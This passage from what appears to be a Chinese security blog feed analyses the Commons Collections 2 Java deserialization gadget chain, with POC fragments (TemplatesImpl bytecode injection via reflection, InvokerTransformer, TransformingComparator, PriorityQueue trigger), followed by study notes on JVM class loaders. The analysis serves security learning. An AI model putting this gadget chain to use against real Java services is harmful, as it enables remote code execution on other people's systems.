class="literal">true</span>);</span><br><span class="line">name.set(TemplatesImpl_instance , <span class="string">&quot;TestTemplatesImpl&quot;</span>);</span><br></pre></td></tr></table></figure><p>其中name只是一个字符串，重要的是_bytecodes这个属性，POC这里把我们之前创建好的恶意类的字节码给赋值进去，那么这么设置进去是为了什么呢，这就要去到com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类里去一探究竟。</p><p>可以看到在TemplatesImpl里面初始定义为null</p><p><img src="/assets/image-20230505184036-54dugc4.png" alt="image.png"></p><p>那反射赋值具体意义就要追溯到defineTransletClasses这个方法中了，以下涉及到类加载器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">        _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            _auxClasses = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check if this is the main class</span></span><br><span class="line">            <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                _transletIndex = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            ErrorMsg err= <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先判断_bytecodes是否为空，这里值不为空，紧接着下方是一些类加载器相关代码，类加载器<a href="../../06/JVM/">参考</a>这篇文章里的类加载器部分。创建一个名为loader的TransletClassLoader实例，也就是获取到了一个类加载器。然后在如下位置使用了loader这个加载器里的defineClass方法把_bytecodes（此时_bytecodes是我们构造的恶意字节）里的字节重新解析成虚拟机所能识别的class</p><p><img src="/assets/image-20230506150217-wh9twwk.png" alt="image.png"></p><p>在loader.defineClass(_bytecodes[i])下面还获取了这个恶意类的父类，并且判断父类的名字是否与其定义的ABSTRACT_TRANSLET常量相等</p><p><img src="/assets/image-20230506150842-da6vd41.png" alt="image.png"></p><p>所以这里就解释了为什么我们构造的恶意类要继承这个类</p><p><img src="/assets/image-20230506150959-97zuol1.png" alt="image.png"></p><p>但是这里并没有使用newInstance方法去实例化这个class，所以我们还需要去寻找一个方法调用了这个defineTransletClasses方法且里面包含newInstance的操作，所以可以找到如下方法</p><p><img src="/assets/image-20230506143104-ucdgixd.png" alt="image.png"></p><p>getTransletInstance</p><p><img src="/assets/image-20230506143202-77c436o.png" alt="image.png"></p><p>这里的try第一个if判断了_name是否为null，如果为null则直接返回null，这也解释了我们为什么通过反射去修改_name的值，第二个if判断_class是否为null，为null的话则调用之前分析的defineTransletClasses方法，紧接这就把_class给newInstance了。到这还是不可控，再往下找看看谁调用了getTransletInstance</p><p><img src="/assets/image-20230506151458-4v3g2b1.png" alt="image.png"></p><p>定位newTransformer方法</p><p><img src="/assets/image-20230506152724-8osubx6.png" alt="image.png"></p><p>可以看到调用了getTransletInstance方法且这个类还是一个Transformer类型的类，Transformer这个类在<a href="../../02/CommonCollections1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/">CC1</a>链中我们已经很熟悉了，还记得在CC1链中有一个关键的类InvokerTransformer，它可以执行任意方法。所以我们把视角拉回到我们构造链上。</p><p>第34-36行代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//构造利用链</span></span><br><span class="line">InvokerTransformer transformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformer_comparator</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br></pre></td></tr></table></figure><p>我们把newTransformer传到InvokerTransformer里，接下来一步就是寻找触发InvokerTransformer.transform的方法。所以CC2链借助了TransformingComparator这个类，这个类里面有一个compare方法里面调用了transform方法。</p><p><img src="/assets/image-20230506155800-jp03bx2.png" alt="image.png"></p><p>那到这里目的就已经很明确了，寻找到一个方法调用到这个compare方法就可以了。</p><p>看看POC里面是怎么触发的</p><p>第38-53行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//触发漏洞</span></span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置comparator属性</span></span><br><span class="line">Field field=queue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(queue,transformer_comparator);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置queue属性</span></span><br><span class="line">field=queue.getClass().getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//队列至少需要2个元素</span></span><br><span class="line">Object[] objects = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;TemplatesImpl_instance , TemplatesImpl_instance&#125;;</span><br><span class="line">field.set(queue,objects);</span><br></pre></td></tr></table></figure><p>首先</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>创建了一个容量为2的PriorityQueue实例</p><p><img src="/assets/image-20230506162606-9w4n7ok.png" alt="image.png"></p><p>该类实现了Serializable接口<img src="/assets/image-20230506162754-v0lznot.png" alt="image.png"></p><p>且重写了readObject方法</p><p><img src="/assets/image-20230506162822-l7mk5vh.png" alt="image.png"></p><p>可以看到POC里通过反射分别把transformer_comparator（POC第36行得到的commons collections自定义的比较器实例）和TemplatesImpl_instance（POC中构造的恶意类字节码TemplatesImpl对象数组）设置给了PriorityQueue的comparator属性和queue属性</p><p><img src="/assets/image-20230506164049-i0hxho7.png" alt="image.png"></p><p>那看看readObject里的具体逻辑吧</p><p><img src="/assets/image-20230506170444-a3uiru8.png" alt="image.png"></p><p><img src="/assets/image-20230506170742-gqnw1xq.png" alt="image.png"></p><p>紧接着调用heapify这个方法，我们进行跟进</p><p><img src="/assets/image-20230506170957-6n1ijeo.png" alt="image.png"></p><p>发现调用siftDown，再跟进</p><p><img src="/assets/image-20230506171110-384mbp2.png" alt="image.png"></p><p>判断comparator是否为null，我们之前已经通过反射对comparator进行设值了，所以走到siftDownUsingComparator，再跟进</p><p><img src="/assets/image-20230506171417-bqfei2m.png" alt="image.png"></p><p>再如下位置发现调用comparator.compare，再往下走一步即可成功执行命令。</p><p>其实在CC2中也可以不借助TemplatesImpl类，在CC1链的基础中，我们只需要找到另外一条触发InvokerTransformer.transform的方法即可，所以我们的链还可以通过如下的方法去构造</p><blockquote><p>PriorityQueue.readObject()–&gt;TransformingComparator.compare()–&gt;ChainedTransformer.transform()–&gt;InvokerTransformer.transform()</p></blockquote><p>具体实现方式和<a href="../../02/CommonCollections1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/">CC1</a>类似，这里就不再重复了。</p>]]></content>
      
      
      <categories>
          
          <category> Java反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JVM</title>
      <link href="/2023/05/06/JVM/"/>
      <url>/2023/05/06/JVM/</url>
      
        <content type="html"><![CDATA[<h1 id="JVM"><a href="#JVM" class="headerlink" title="JVM"></a>JVM</h1><blockquote><p>本文是自己站在安全学习者角度上去学习JVM的笔记，后续可能也会随着自己所需要用到再不断完善该篇文章。假如您是一个开发从业者或其他从业者需要学习JVM，本文可能不适合去系统学习JVM。</p></blockquote><p>jvm是Java Virtual Machine (Java虚拟机) 的缩写，jvm是一种用于计算设备的规范，它是一个虚拟出来的计算机，是通过再实际的计算机上仿真模拟各种计算机功能来实现的。Java语言的一个非常重要的特点就是与平台的无关性。而使用Java虚拟机是实现这一特点的关键。一般的高级语言如果要在不同的平台上运行，至少需要编译成不同的目标代码。而引入了Java虚拟机后，Java语言在不同平台上运行时不需要重新的编译。Java语言使用Java虚拟机屏蔽了与具体平台相关的信息，使得Java语言编译程序只需生成虚拟机上运行的目标代码(字节码)，就可以在各种平台上不加修改的运行，Java虚拟机在执行字节码时，把字节码解释成具体平台上的机器指令执行，这就是Java的能够”一次编译，到处运行的原因”。</p><h1 id="JVM位置及体系结构"><a href="#JVM位置及体系结构" class="headerlink" title="JVM位置及体系结构"></a>JVM位置及体系结构</h1><p>JVM运行在操作系统之上，如下图</p><p><img src="/assets/image-20230426172159-7my4d27.png" alt="image.png"></p><p>其体系结构如下</p><p><img src="/assets/image-20230426172634-r0en2rc.png" alt="image.png"></p><h1 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h1><p>类加载器用来加载class文件，把文件加载到内存中</p><p>我们可以通过类来创建对象，也能通过对象返回来获取类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//类只是一个模板，但是对象是具体的</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="comment">//创建三个对象</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="comment">//分别输出</span></span><br><span class="line">        System.out.println(<span class="string">&quot;----------对象不是同一个----------&quot;</span>);</span><br><span class="line">        System.out.println(person1);</span><br><span class="line">        System.out.println(person2);</span><br><span class="line">        System.out.println(person3);</span><br><span class="line">        <span class="comment">//通过对象获取类</span></span><br><span class="line">        System.out.println(<span class="string">&quot;----------类是同一个----------&quot;</span>);</span><br><span class="line">        System.out.println(person1.getClass());</span><br><span class="line">        System.out.println(person2.getClass());</span><br><span class="line">        System.out.println(person3.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230426192506-msc4xdb.png" alt="image.png"></p><p>对于虚拟机来说只有两类类加载器一种是Bootstrap ClassLoader是通过C++语言实现的，是虚拟机自身的一部分，另一类是其它类加载器，是使用Java语言实现的都继承自java.lang.ClassLoader</p><ul><li>启动类加载器（Bootstrap CLassLoader）：属于虚拟机的一部分，通过C++实现的，负责加载存放在<JAVA_HOME>\lib目录，或者被-Xbootclasspath参数所指定的路径存放的类</li><li>扩展类加载器（Extension ClassLoader）：独立于虚拟机， 负责加载<JAVA_HOME>\lib\ext中的类库。java9之后由于模块化的需要被PlatFormClassLoader取代</li><li>应用程序类（Application ClassLoader）：独立于虚拟机，主要负责加载用户类路径（classPath）上的类库，如果没有实现自定义类加载器，那么这个这个加载器就是我们程序的默认类加载器</li><li>自定义类加载器</li></ul><p><strong>其中加载器之间也存在父子级关系</strong></p><p><img src="/assets/image-20230426194221-ac3h10t.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> person.getClass();</span><br><span class="line">        <span class="comment">//获取类加载器</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> aClass.getClassLoader();</span><br><span class="line">        System.out.println(classLoader);  <span class="comment">//Application ClassLoader</span></span><br><span class="line">        System.out.println(classLoader.getParent());  <span class="comment">//Extension ClassLoader</span></span><br><span class="line">        System.out.println(classLoader.getParent().getParent());  <span class="comment">//Bootstrap CLassLoader(获取到的值为null，因为该加载器通过C++实现，java获取不到)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230426193753-5uxmxfa.png" alt="image.png"></p><h2 id="双向委派机制"><a href="#双向委派机制" class="headerlink" title="双向委派机制"></a>双向委派机制</h2><p>一个类加载器在收到一个类加载请求的时候，它不会自动去加载这个类，而是把这个类委托给父类加载器去完成，每一层重复这样的操作，当父类加载器反馈自己无法完成该加载请求的时候，子类加载器才会去加载该字节码文件。</p><p>该机制避免了重复加载和核心类被修改</p><blockquote><p>但是在java9以及以后的版本中，为了模块化系统的顺利实施，模块下的类加载器主要有几个变动：</p><p>1.扩展类加载器（Extension Class Loader）被平台类加载器（Platform ClassLoader）取代（java9中整个JDK都是基于了模块化的构建，原来的rt.jar和tools.jar都被拆分了数十个JMOD文件）。因为java类库可以满足扩展的需求并且能随时组合构建出程序运行的jre,所以取消了JAVA_HOME\lib\ext和JAVA_HOME\jre目录</p><p>2.平台类加载器和应用程序类加载器都不在派生自java.net.URLClassLoader。现在启动类加载器、平台类加载器、应用程序类加载器全都继承于jdk.internal.loader.BuiltinClassLoader,在BuiltinClassLoader中实现了新的模块化架构下类如何从模块中加载的逻辑，以及模块中资源可访问性的处理。</p><p>就是说平台以及应用程序类加载器收到类的加载请求的时候，在委派给父类加载器家在之前，要先判断该类是否归属于摸一个系统模块，如果可以找到这样的归属关系，就要优先委派给负责那个模块的加载器完成加载。<br /></p></blockquote><p><img src="/assets/image-20230426201037-za4fj21.png" alt="image.png"></p><h2 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h2><p>所有的类加载器（除根类加载器）都必须继承java.lang.ClassLoader</p><h3 id="loadClass"><a href="#loadClass" class="headerlink" title="loadClass"></a>loadClass</h3><blockquote><p>在ClassLoader的源码中，有一个方法loadClass(String name,boolean resolve)，这里就是双亲委托模式的代码实现。从源码中我们可以观察到它的执行顺序。需要注意的是，只有父类加载器加载不到类时，会调用findClass方法进行类的查找，所以，在定义自己的类加载器时，不要覆盖掉该方法，而应该覆盖掉findClass方法。<br /></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ClassLoader类的loadClass源码</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">            <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">            Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">t0</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">                        c = parent.loadClass(name, <span class="literal">false</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        c = findBootstrapClassOrNull(name);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                    <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                    <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                    <span class="comment">// to find the class.</span></span><br><span class="line">                    <span class="type">long</span> <span class="variable">t1</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                    c = findClass(name);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                    sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                    sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                    sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">                resolveClass(c);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230505223437-oqhqvix.png" alt="image.png"></p><h3 id="findClass"><a href="#findClass" class="headerlink" title="findClass"></a>findClass</h3><p>在自定义类加载器时，一般我们需要覆盖这个方法，且ClassLoader中给出了一个默认的错误实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h3><p>该方法的解释如下。用来将byte字节解析成虚拟机能够识别的Class对象。defineClass()方法通常与findClass()方法一起使用。在自定义类加载器时，会直接覆盖ClassLoader的findClass()方法获取要加载类的字节码，然后调用defineClass()方法生成Class对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name,<span class="type">byte</span>[] b,<span class="type">int</span> off,<span class="type">int</span> len) <span class="keyword">throws</span> ClassFormatError</span><br></pre></td></tr></table></figure><h3 id="resolveClass"><a href="#resolveClass" class="headerlink" title="resolveClass"></a>resolveClass</h3><p>连接指定的类，类加载器可以使用此方法来连接类。</p><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><blockquote><p>在java.net包中，JDK提供了一个更加易用的类加载器URLClassLoader，它扩展了ClassLoader，能够从本地或者网络上指定的位置加载类。我们可以使用该类作为自定义的类加载器使用。</p></blockquote><p>构造方法</p><blockquote><p>public URLClassLoader(URL[] urls)：指定要加载的类所在的URL地址，父类加载器默认为系统类加载器。<br>public URLClassLoader(URL[] urls, ClassLoader parent)：指定要加载的类所在的URL地址，并指定父类加载器。<br /></p></blockquote><p>案例一：加载磁盘上的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"><span class="comment">//指定需要加载类的指定位置</span></span><br><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;d:/&quot;</span>);</span><br><span class="line"><span class="comment">//获取对应的uri</span></span><br><span class="line"><span class="type">URI</span> <span class="variable">uri</span> <span class="operator">=</span> file.toURI();</span><br><span class="line"><span class="comment">//获取对应的 url</span></span><br><span class="line"><span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> uri.toURL();</span><br><span class="line"><span class="comment">//构建URLClassLoader </span></span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;url&#125;);</span><br><span class="line">        System.out.println(classLoader.getParent());</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> classLoader.loadClass(<span class="string">&quot;com.ceshi.Demo&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> aClass.newInstance();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>案例二：加载网络上的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"><span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://localhost:8080/examples/&quot;</span>);</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;url&#125;);</span><br><span class="line">        System.out.println(classLoader.getParent());</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> classLoader.loadClass(<span class="string">&quot;com.ceshi.Demo&quot;</span>);</span><br><span class="line">        aClass.newInstance();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="自定义加载器"><a href="#自定义加载器" class="headerlink" title="自定义加载器"></a>自定义加载器</h2><blockquote><p>我们如果需要自定义类加载器，只需要继承ClassLoader类，并覆盖掉findClass方法即可。</p></blockquote><h3 id="自定义文件类加载器"><a href="#自定义文件类加载器" class="headerlink" title="自定义文件类加载器"></a>自定义文件类加载器</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 